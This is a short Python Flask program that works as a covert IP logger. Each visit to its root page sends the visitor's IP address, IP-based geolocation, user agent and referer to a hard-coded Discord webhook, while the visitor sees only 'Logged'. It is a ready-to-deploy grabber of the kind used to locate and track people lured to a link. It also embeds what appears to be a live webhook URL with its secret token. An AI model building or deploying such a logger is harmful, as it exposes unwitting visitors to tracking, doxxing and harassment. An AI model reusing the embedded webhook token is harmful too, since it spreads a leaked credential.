from flask import Flask, request
import requests
import json
from datetime import datetime, timezone

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1531275791600455920/eqjzGUGNuyHBs9awFBnwWJwV-HLZ_lgNtygrbi_jcUnU8BHiKWhLNh3bnaoM3TA2Nov5"

def get_geolocation(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=4)
        data = resp.json()
        city = data.get('city', 'Unknown')
        region = data.get('region', 'Unknown')
        country = data.get('country_name', 'Unknown')
        return f"{city}, {region}, {country}"
    except:
        return "Geolocation unavailable"

def send_to_discord(ip, user_agent, referer):
    geo = get_geolocation(ip)
    embed = {
        "title": "🌐 New IP Logged",
        "color": 0x00ff00,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": [
            {"name": "IP Address", "value": f"[{ip}](https://ipinfo.io/{ip})", "inline": True},
            {"name": "Geolocation", "value": geo, "inline": True},
            {"name": "User Agent", "value": user_agent[:150] + ("..." if len(user_agent) > 150 else ""), "inline": False},
            {"name": "Referer", "value": referer or "Direct visit", "inline": True}
        ],
        "footer": {"text": "Render IP Logger | Live"}
    }
    payload = {"embeds": [embed]}
    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        return r.status_code == 204
    except:
        return False

@app.route('/')
def log_ip():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer')
    send_to_discord(visitor_ip, user_agent, referer)
    return "Logged", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
